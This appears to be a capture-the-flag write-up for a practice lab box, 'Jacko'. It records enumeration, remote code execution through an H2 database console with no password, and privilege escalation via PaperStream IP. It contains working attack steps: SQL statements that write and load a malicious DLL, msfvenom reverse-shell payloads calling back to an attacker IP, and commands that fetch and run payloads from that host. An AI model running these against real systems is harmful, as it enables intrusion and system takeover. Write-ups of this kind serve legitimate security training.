# PG Jacko
## H2 Database
## nmap
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-14T18:00:47
|_  start_date: N/A
```
## 80 dirbrute
```
http://192.168.105.66/html/main.html
H2 Database Engine, Java SQL database engine

$ gobuster dir -u http://192.168.105.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x asp,apsx,html,txt -t 80
===============================================================
2021/08/14 11:03:53 Starting gobuster in directory enumeration mode
===============================================================
/html                 (Status: 301) [Size: 150] [--> http://192.168.105.66/html/]
/images               (Status: 301) [Size: 152] [--> http://192.168.105.66/images/]
/help                 (Status: 301) [Size: 150] [--> http://192.168.105.66/help/]
/index.html           (Status: 200) [Size: 1595]
/text                 (Status: 301) [Size: 150] [--> http://192.168.105.66/text/]

# Documentation on how to use the database engine and connect to the db.
```
## 8082 H2 Database Exploit
```
192.168.105.x:8082/login.jsp
H2 database http console

# trying default credentials
sa:tisadmin

# no password is set
sa:<nothing> works

https://www.exploit-db.com/exploits/49384

If we execute the following SQL statements we get RCE:
-- Write native library
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90), ... ,CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');

-- Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

-- Evaluate script
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

With this, we can run the systeminfo command. This shows us that the architecture is x64.
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.49.103 LPORT=445 -f exe > reverse.exe

copy files via SMB, so it likely won't be blocked by the firewall.
Copy the payload to the victim machine via SMB:
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c copy \\\\192.168.49.x\\ROPNOP\\reverse.exe c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');

Running the payload:
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("c:\\users\\tony\\reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

## Privesc
```
Always check for vulnerable apps if WinPEAS does not find anything useful:
dir "C:\Program Files (x86)"
```
## PaperStream
```
We can check the PaperStream IP version, it is 1.42.
This version is vulnerable to a privilege escalation vulnerability.
https://www.exploit-db.com/exploits/49382
msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=tun0 LPORT=445

Transfer with Powershell
After we locate the location of powershell.exe, we can transfer.

$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("http://192.168.49.103/49382.ps1","C:\users\tony\49382.ps1")
Run the exploit: C:\users\tony\49382.ps1
NT authority gained. 

```



